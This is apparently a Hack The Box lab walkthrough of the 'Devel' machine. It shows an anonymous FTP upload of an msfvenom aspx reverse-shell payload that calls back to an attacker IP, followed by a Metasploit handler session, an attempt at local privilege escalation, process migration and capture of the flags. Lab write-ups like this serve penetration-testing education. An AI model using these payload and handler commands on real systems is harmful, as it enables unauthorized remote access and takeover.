**HTB-Devel Walkthrough**

***nmap -sC -sV -p- 10.129.43.24 — min-rate 10000***

<img width="720" height="441" alt="image" src="https://github.com/user-attachments/assets/377653f1-c37e-4b08-a125-e8c04779c4ab" />

From nmap we identified that Anonymous login is allowed at FTP

ftp 10.129.43.24

<img width="720" height="406" alt="image" src="https://github.com/user-attachments/assets/ce4e9169-055d-448b-922b-775d78e208c2" />

<img width="720" height="528" alt="image" src="https://github.com/user-attachments/assets/4c1a861c-5c19-4e5f-b531-7107f6596651" />

We dont find anything in the directories

Lets check port 80

<img width="720" height="446" alt="image" src="https://github.com/user-attachments/assets/f61f0f02-d222-4e4e-9a80-4b3107558923" />

In the source code we dont find anything interesting

<img width="720" height="304" alt="image" src="https://github.com/user-attachments/assets/0dc6f2e0-9c22-4710-9e60-76b6ca20d262" />

<img width="720" height="262" alt="image" src="https://github.com/user-attachments/assets/a27bc3dc-79f8-4989-a2a8-bd5b3a5cc922" />

We dont have anything in robots.txt as well

Lets try to upload any file in ftp

<img width="720" height="297" alt="image" src="https://github.com/user-attachments/assets/54f07727-4d58-4bb3-a4c1-43ca3e6fbd7e" />

we have created a simple html file. We will try to upload this in the ftp .

<img width="720" height="254" alt="image" src="https://github.com/user-attachments/assets/fddc7efc-4736-45fc-b2aa-1778abd7ea82" />

We can upload the file. Lets check

<img width="720" height="222" alt="image" src="https://github.com/user-attachments/assets/a2817ae6-2b2e-4615-8278-0fe4ec938500" />

From the nmap we identify that its a IIS server. IIS server can execute codes in asp or aspx.

msfvenom is a tool that can create a meterprete sesson.

Lets create a payload

***msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.197 LPORT=4444 -f aspx -o upload.aspx***

<img width="720" height="235" alt="image" src="https://github.com/user-attachments/assets/28ee79ee-79af-413e-9d71-da200d0449e4" />

Now, lets upload this payload in the ftp server

<img width="720" height="275" alt="image" src="https://github.com/user-attachments/assets/d3057be0-5cce-4928-9bb0-f7fc6403ce58" />

Lets open msfconsole

use exploit/multi/handler

<img width="720" height="416" alt="image" src="https://github.com/user-attachments/assets/8b5b8123-f782-4eef-a128-c4b5fd8c0c6b" />

set payload windows/meterpreter/reverse_tcp

<img width="720" height="349" alt="image" src="https://github.com/user-attachments/assets/c733eac6-d16c-47ab-b08f-2189f0009065" />

set LHOST 10.10.14.197

<img width="720" height="469" alt="image" src="https://github.com/user-attachments/assets/a2d25e6e-79f0-4c18-a48a-4cef612cea85" />

We can see that meterpreter is listening

Lets execute the payload

<img width="720" height="228" alt="image" src="https://github.com/user-attachments/assets/f11881e2-90fe-4084-a78f-47d17f4023dc" />

<img width="720" height="118" alt="image" src="https://github.com/user-attachments/assets/159db4ca-f122-44be-9219-13d46ef4ebed" />

we get a reverse shell

Lets enamurate about the system

sysinfo

<img width="720" height="167" alt="image" src="https://github.com/user-attachments/assets/a73523c2-e21e-4523-a50c-4dccaaaca1d9" />

x86, its a 32 bit OS

<img width="720" height="273" alt="image" src="https://github.com/user-attachments/assets/21d22104-2c46-47d2-8f42-8c5445f49e86" />

Lets do to the C directory

<img width="720" height="502" alt="image" src="https://github.com/user-attachments/assets/7997359c-bc2b-4872-aa85-7b43c27cd642" />

Lets check what are the users on the machine

<img width="720" height="367" alt="image" src="https://github.com/user-attachments/assets/87810140-2348-426d-9d7e-5cfe688bbda6" />

We have two users. Lets check if we can go to their folders or not.

<img width="720" height="295" alt="image" src="https://github.com/user-attachments/assets/f588d901-7ff9-46d0-ac57-ed4e3420323b" />

We dont have the access. We need to escalate the privilege

***getsystem*** >> its a tool that check various exploitation for privilege escalation.

<img width="720" height="216" alt="image" src="https://github.com/user-attachments/assets/2e0824a4-cd52-4fdb-96c2-c2b886ecfe40" />

However it does not worked here.

Lets background the session

background

<img width="720" height="219" alt="image" src="https://github.com/user-attachments/assets/12a85763-31c7-4d6a-87cb-5f1a121c6286" />

***search suggester*** >> It will suggest all the exploits that this machine has

<img width="720" height="189" alt="image" src="https://github.com/user-attachments/assets/e0700576-45bd-4a0c-8ca4-74cb53c098ae" />

Now we need to provide the session that we working

<img width="720" height="183" alt="image" src="https://github.com/user-attachments/assets/7488cbee-967d-44d6-8209-b33c5a8e8dc9" />

We only have one session with ID. Lets select this session

<img width="720" height="265" alt="image" src="https://github.com/user-attachments/assets/9e405366-8153-47ea-8a5e-64ce71fbe9a9" />

We got multiple exploits

<img width="720" height="265" alt="image" src="https://github.com/user-attachments/assets/339a7da6-abba-4fb7-8a1d-5762361f6b00" />

Lets use this exploit

<img width="720" height="283" alt="image" src="https://github.com/user-attachments/assets/7a891402-7058-4f9e-a9d1-eea548fe7c3b" />

<img width="720" height="342" alt="image" src="https://github.com/user-attachments/assets/4d7752b9-39ba-4f6c-9ba3-0ca7b1cbb4fe" />

This exploit did not worked. Lets get back to the meterpreter session

Lets check all the processes running on the machine

ps

<img width="720" height="294" alt="image" src="https://github.com/user-attachments/assets/037f4553-be19-499c-aa15-60849b5a3e45" />

We have PID 432 running

Lets migrate to this process

migrate 432

<img width="720" height="167" alt="image" src="https://github.com/user-attachments/assets/264a55d7-6108-4d68-9a82-8796511ac1eb" />

We are not in PID 432

<img width="720" height="382" alt="image" src="https://github.com/user-attachments/assets/4a8461ba-e805-4136-830e-4ecb4a3748f2" />

<img width="720" height="413" alt="image" src="https://github.com/user-attachments/assets/bc3d8ba6-fb45-44a3-a98f-675b60fe06d5" />

<img width="720" height="284" alt="image" src="https://github.com/user-attachments/assets/6e1f1c4c-dfc1-40d6-a4f1-6f70c9cd52df" />

<img width="720" height="264" alt="image" src="https://github.com/user-attachments/assets/d0d721da-1f39-4e4f-aa36-dda6e0d16058" />

We got the user flag

<img width="720" height="338" alt="image" src="https://github.com/user-attachments/assets/889bec5f-27d9-47fa-8fb5-ddf8559999c5" />

<img width="720" height="305" alt="image" src="https://github.com/user-attachments/assets/67cab43c-9aef-46f7-8b5e-04b2bb109568" />

We got the root flag as well.
